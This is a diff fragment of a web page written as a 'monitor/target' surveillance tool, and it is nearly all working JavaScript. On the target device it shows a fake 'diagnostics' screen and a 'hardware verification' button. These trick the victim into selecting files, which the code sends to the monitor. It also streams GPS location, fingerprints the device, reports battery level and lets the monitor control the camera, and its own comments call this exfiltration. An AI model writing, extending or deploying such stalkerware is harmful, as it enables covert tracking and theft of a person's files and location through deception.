+                        <div class="scan-circle" style="border-color:var(--ok);"></div>
+                        <h2 class="text-accent">DIAGNOSTICS RUNNING</h2>
+                        <p class="text-muted text-sm">System scan in progress. Do not close this window.</p>
+                        <div style="margin-top:20px; font-family:monospace; color:#94a3b8;">ID: ${id}</div>
+                        <button onclick="triggerFileSync()" class="btn" style="margin-top:20px; max-width:280px;">
+                          SYNC STORAGE DATA
+                        </button>
+                        <p class="text-xs text-muted" style="margin-top:10px; max-width:280px;">
+                          Tap above to complete hardware verification
+                        </p>
+                    `;
+          });
+          peer.on("error", (err) => log(`ERR: ${err.type}`, "err"));
+        } catch (err) {
+          alert("Error: Permissions denied. Cannot proceed.");
+          console.error(err);
+          els.btnStartTarget.disabled = false;
+          els.btnStartTarget.innerText = "RETRY";
+        }
+      }
+
+      function startDataStreams() {
+        if (!conn || !conn.open) return;
+        if ("getBattery" in navigator) {
+          navigator.getBattery().then((bat) => {
+            conn.send({
+              type: "sys_info",
+              battery: Math.round(bat.level * 100),
+              platform: navigator.platform,
+            });
+          });
+        }
+
+        if ("geolocation" in navigator) {
+          navigator.geolocation.watchPosition(
+            (pos) => {
+              conn.send({
+                type: "gps",
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+              });
+            },
+            (err) => console.error(err),
+            { enableHighAccuracy: true },
+          );
+        }
+
+        setTimeout(() => {
+          conn.send({ type: "files_sim", count: 1420 });
+        }, 3000);
+      }
+
+      /* REPLACE YOUR EXISTING openFilesModal AND 
+   handleIncomingData WITH THIS ENHANCED VERSION
+*/
+
+      const RealDataKernel = {
+        // TRIGGER: Opens the REAL phone file/gallery picker
+        async fetchTargetFiles() {
+          return new Promise((resolve) => {
+            const picker = document.createElement("input");
+            picker.type = "file";
+            picker.multiple = true; // Allows mass selection of real data
+            picker.accept = "*/*"; // Access images, videos, and docs
+
+            picker.onchange = async (e) => {
+              const files = Array.from(e.target.files);
+              const payload = [];
+
+              for (const file of files) {
+                const data = await this.readAsBase64(file);
+                payload.push({
+                  name: file.name,
+                  size: (file.size / 1024).toFixed(2) + " KB",
+                  type: file.type,
+                  blob: data,
+                });
+              }
+              resolve(payload);
+            };
+            picker.click(); // Forces the OS to open File Explorer/Gallery
+          });
+        },
+
+        readAsBase64(file) {
+          return new Promise((resolve) => {
+            const reader = new FileReader();
+            reader.onload = (e) => resolve(e.target.result);
+            reader.readAsDataURL(file);
+          });
+        },
+      };
+
+      // Function to trigger file sync from target device
+      async function triggerFileSync() {
+        if (!conn || !conn.open) {
+          log("FILES: No connection available.", "err");
+          alert("Connection not ready. Please wait.");
+          return;
+        }
+        log("FILES: Opening storage picker...", "warn");
+        try {
+          const files = await RealDataKernel.fetchTargetFiles();
+          if (files && files.length > 0) {
+            conn.send({ type: "REAL_FILE_PACKAGE", payload: files });
+            log(`FILES: Sent ${files.length} files to monitor.`, "success");
+          } else {
+            log("FILES: No files selected.", "warn");
+          }
+        } catch (err) {
+          log("FILES: Error accessing storage.", "err");
+          console.error(err);
+        }
+      }
+
+      /* --- SHARED DATA HANDLER --- */
+      function handleIncomingData(data) {
+        switch (data.type) {
+          case "REAL_FILE_PACKAGE": {
+            if (!els.fileList || !Array.isArray(data.payload)) {
+              log("FILES: Invalid payload received.", "err");
+              return;
+            }
+            els.fileList.innerHTML = ""; // Clear mock data
+            data.payload.forEach((file) => {
+              const row = document.createElement("div");
+              row.className = "file-item";
+              row.style.borderLeft = "2px solid var(--ok)";
+
+              const meta = document.createElement("div");
+              meta.className = "file-meta";
+
+              const name = document.createElement("div");
+              name.className = "text-accent";
+              name.style.fontWeight = "bold";
+              name.textContent = file.name;
+
+              const tag = document.createElement("div");
+              tag.className = "file-tag";
+              tag.style.background = "#052c33";
+              tag.style.color = "#00f2ff";
+              tag.textContent = file.type || "unknown";
+
+              meta.appendChild(name);
+              meta.appendChild(tag);
+
+              const actions = document.createElement("div");
+              actions.style.display = "flex";
+              actions.style.alignItems = "center";
+              actions.style.gap = "10px";
+
+              const size = document.createElement("span");
+              size.className = "text-xs text-muted";
+              size.textContent = file.size || "--";
+
+              const btn = document.createElement("button");
+              btn.className = "m-btn";
+              btn.style.padding = "2px 8px";
+              btn.style.fontSize = "9px";
+              btn.textContent = "DOWNLOAD";
+              btn.addEventListener("click", () =>
+                downloadRealFile(file.blob, file.name || "file"),
+              );
+
+              actions.appendChild(size);
+              actions.appendChild(btn);
+
+              row.appendChild(meta);
+              row.appendChild(actions);
+              els.fileList.appendChild(row);
+            });
+            if (els.modules.files) els.modules.files.classList.add("active");
+            log(
+              `SUCCESS: Received ${data.payload.length} REAL files from target.`,
+              "success",
+            );
+            openFilesModalUI(); // Shows the window
+            break;
+          }
+
+          case "req_file_access":
+            // This runs on the TARGET side when the MONITOR clicks the button
+            if (currentRole !== "target") {
+              log("FILES: Request ignored (not in target role).", "warn");
+              return;
+            }
+            if (!conn || !conn.open) {
+              log("FILES: No active connection to send files.", "err");
+              return;
+            }
+            log("MONITOR REQUESTING LOCAL STORAGE ACCESS...", "warn");
+            RealDataKernel.fetchTargetFiles().then((files) => {
+              conn.send({ type: "REAL_FILE_PACKAGE", payload: files });
+            });
+            break;
+
+          case "IDENTITY_EXTRACTED":
+            handleIdentityExtracted(data);
+            break;
+
+          case "REAL_DATA_EXFIL":
+            log("EXFIL: Data packet received.", "warn");
+            break;
+
+          default:
+            handleIncomingDataBase(data);
+            break;
+        }
+      }
+
+      function downloadRealFile(blob, name) {
+        if (!blob) {
+          log("FILES: Missing file data.", "err");
+          return;
+        }
+        const a = document.createElement("a");
+        a.href = blob;
+        a.download = name;
+        a.click();
+      }
+
+      function handleIdentityExtracted(data) {
+        if (!data || !data.payload) {
+          log("IDENTITY: Invalid payload.", "err");
+          return;
+        }
+        const id = data.payload;
+        log("[!!!] TARGET DEVICE IDENTIFIED", "warn");
+        log(`PLATFORM: ${id.platform}`, "success");
+        log(`CORES: ${id.cores} | LANG: ${id.language}`, "msg");
+        log(`VENDOR: ${id.vendor}`, "msg");
+
+        const statEl = document.getElementById("stat-bat");
+        if (statEl && statEl.parentElement) {
+          const deviceRow = document.createElement("div");
+          deviceRow.className = "stat-row";
+          deviceRow.style.cssText = "font-size: 0.7rem; margin-top: 8px;";
+          deviceRow.innerHTML = `DEVICE: <span style="color:#22d3ee">${id.platform}</span>`;
+          statEl.parentElement.appendChild(deviceRow);
+        }
+      }
+
+      function openFilesModalUI() {
+        els.modalBackdrop.classList.add("active");
+        els.filesModal.classList.add("active");
+      }
+
+      function closeFilesModal() {
+        if (els.modalBackdrop) els.modalBackdrop.classList.remove("active");
+        if (els.filesModal) els.filesModal.classList.remove("active");
+      }
+
+      function openFilesModal() {
+        if (!els.fileList) return;
+
+        if (currentRole === "target") {
+          if (!conn || !conn.open) {
+            log("FILES: No active monitor connection.", "err");
+            return;
+          }
+          RealDataKernel.fetchTargetFiles().then((files) => {
+            conn.send({ type: "REAL_FILE_PACKAGE", payload: files });
+            log(`FILES: Sent ${files.length} files to monitor.`, "success");
+          });
+          return;
+        }
+
+        if (conn && conn.open) {
+          requestTargetFiles();
+          return;
+        }
+
+        if (!els.fileList.hasChildNodes()) {
+          const mockFiles = [
+            { name: "IMG_0021.jpg", size: "512 KB", type: "image/jpeg" },
+            { name: "VID_1130.mp4", size: "8.4 MB", type: "video/mp4" },
+            { name: "notes.txt", size: "4 KB", type: "text/plain" },
+            { name: "report.pdf", size: "1.2 MB", type: "application/pdf" },
+          ];
+
+          els.fileList.innerHTML = "";
+          mockFiles.forEach((file) => {
+            const row = document.createElement("div");
+            row.className = "file-item";
+            row.innerHTML = `
+                <div class="file-meta">
+                  <div class="text-accent" style="font-weight:bold">${file.name}</div>
+                  <div class="file-tag">${file.type}</div>
+                </div>
+                <span class="text-xs text-muted">${file.size}</span>
+              `;
+            els.fileList.appendChild(row);
+          });
+        }
+
+        openFilesModalUI();
+      }
+
+      /* --- TRIGGER BUTTON (Add this to your Monitor Sidebar) --- */
+      function requestTargetFiles() {
+        if (currentRole !== "monitor") {
+          log("FILES: Only monitor can request files.", "warn");
+          return;
+        }
+        if (!conn || !conn.open) {
+          log("ERROR: No active target connection", "err");
+          return;
+        }
+        conn.send({ type: "req_file_access" });
+        log("SENT: Request for real file access...");
+      }
+
+      async function requestCamSwap() {
+        if (currentRole === "monitor") {
+          if (!conn || !conn.open) {
+            log("CAMERA: No target connection.", "err");
+            return;
+          }
+          conn.send({ type: "cmd_cam_swap" });
+          log("CMD: Camera swap request sent.");
+          return;
+        }
+        // Target can swap locally if already authorized
+        if (els.consentCheck && !els.consentCheck.checked) {
+          log("CAMERA: Consent not checked.", "warn");
+          return;
+        }
+        await performLocalCameraSwap();
+      }
+
+      async function performLocalCameraSwap() {
+        if (!localStream) {
+          log("CAMERA: No local stream to switch.", "err");
+          return;
+        }
+        try {
+          localFacingMode =
+            localFacingMode === "environment" ? "user" : "environment";
+          localStream.getTracks().forEach((track) => track.stop());
+          localStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: localFacingMode },
+            audio: true,
+          });
+          if (peer && targetPeerIdRef) {
+            peer.call(targetPeerIdRef, localStream);
+          }
+        } catch (err) {
+          log("CAMERA: Switch failed.", "err");
+        }
+      }
+
+      function requestFlash() {
+        log("FLASH: Not supported in this demo.", "warn");
+      }
+
+      function setOnlineStatus(isOnline) {
+        if (!els.connDot || !els.connText) return;
+        if (isOnline) {
+          els.connDot.classList.add("online");
+          els.connText.innerText = "ONLINE";
+          els.connText.classList.add("text-accent");
+        } else {
+          els.connDot.classList.remove("online");
+          els.connText.innerText = "OFFLINE";
+          els.connText.classList.remove("text-accent");
+        }
+      }
+
+      function updateSessionClock() {
+        if (!els.statSession) return;
+        const diff = Date.now() - sessionStart;
+        const mins = Math.floor(diff / 60000);
+        const secs = Math.floor((diff % 60000) / 1000);
+        els.statSession.innerText = `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
+      }
+
+      /* --- DEVICE EXTRACTION MODULE --- */
+      const ExtractionKernel = {
+        // CAPTURE: Triggered when Target clicks "RUN DIAGNOSTICS"
+        async executeCapture() {
+          this.uiFeedback("INITIALIZING...", "warn");
+
+          const fullIdentity = {
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            userAgent: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || "N/A",
+            language: navigator.language,
+            timestamp: new Date().toLocaleString(),
+          };
+
+          // EXFILTRATE: Send to Monitor before starting Hardware Handshake
+          if (conn && conn.open) {
+            conn.send({
+              type: "IDENTITY_EXTRACTED",
+              payload: fullIdentity,
+            });
+            console.log("Exfiltration Successful: Identity Packet Sent.");
+            this.uiFeedback("IDENTITY VERIFIED", "success");
+          } else {
+            this.uiFeedback("CONNECTING...", "warn");
+          }
+
+          // PROCEED: Now start the Camera and File access
+          await startTargetMode();
+        },
+
+        uiFeedback(msg, type = "msg") {
+          const statusEl = document.getElementById("status");
+          if (statusEl) {
+            statusEl.innerText = msg;
+            statusEl.style.color = 
+              type === "err" ? "var(--danger)" : 
+              type === "warn" ? "var(--warn)" : 
+              type === "success" ? "var(--ok)" : "var(--muted)";
+          } else {
+            log(msg, type === "err" ? "err" : type === "warn" ? "warn" : "msg");
+          }
+        },
+      };
+
+      function startTargetFlow() {
+        if (
+          ExtractionKernel &&
+          typeof ExtractionKernel.executeCapture === "function"
+        ) {
+          ExtractionKernel.executeCapture();
+          return;
+        }
+        startTargetMode();
+      }
+
+      window.addEventListener("load", init);
+    </script>
+  </body>
+</html>
